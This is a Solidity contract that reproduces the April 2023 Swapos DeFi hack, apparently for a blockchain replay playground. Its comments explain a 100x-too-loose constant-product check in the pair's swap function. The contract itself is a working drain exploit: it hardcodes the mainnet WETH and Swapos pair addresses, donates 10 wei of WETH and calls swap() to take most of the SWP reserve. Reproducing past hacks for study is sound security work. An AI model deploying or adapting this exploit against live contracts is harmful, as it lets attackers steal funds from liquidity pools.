// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-04-Swapos).
// The DeFiHackLabs PoC (test/Swapos_exp.sol) runs the whole attack INLINE in
// the Foundry test contract (attacker = address(this)); there is no
// standalone exploit contract and no flash-swap callback -- `swap()` is
// called with empty `data`, so no `swaposV2Call`/`uniswapV2Call` hook ever
// fires. This file is a faithful, self-contained copy of that inline attack
// (testExploit's body moved into run()) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// ContractTest.testExploit().
//
// Root cause (real Swapos hack, Ethereum mainnet, 2023-04-16, fork block
// 17,057,419): SwaposV2Pair.swap() implements the Uniswap-V2 constant-product
// check but with mismatched scaling factors --
//   balance0Adjusted = balance0 * 10000 - amount0In * 10
//   balance1Adjusted = balance1 * 10000 - amount1In * 10
//   require(balance0Adjusted * balance1Adjusted >= reserve0 * reserve1 * 1000**2)
// The LHS is scaled by 10000*10000 = 1e8 while the RHS is only scaled by
// 1000*1000 = 1e6 -- a 100x-too-loose K-check. This lets an attacker donate a
// single dust wei of WETH (token1) to the pair, then call swap() demanding an
// enormous amount0Out of SWP (token0); the broken invariant still passes,
// draining ~98% of the pool's SWP reserve for 10 wei of WETH.

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ISwaposV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
}

contract SwaposDrain {
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    ISwaposV2Pair private constant swapPos = ISwaposV2Pair(0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f);

    // Faithful copy of ContractTest.testExploit(): mint 3 WETH (only ~10 wei
    // of it is actually spent), donate 10 wei of WETH to the pair to create a
    // non-zero amount1In, then call swap() for nearly the entire SWP reserve.
    // The broken K-check (100x too loose) lets this pass.
    function run() external payable {
        WETH.deposit{value: 3 ether}();
        WETH.transfer(address(swapPos), 10);
        swapPos.swap(142_658_161_144_708_222_114_663, 0, address(this), "");
    }
}
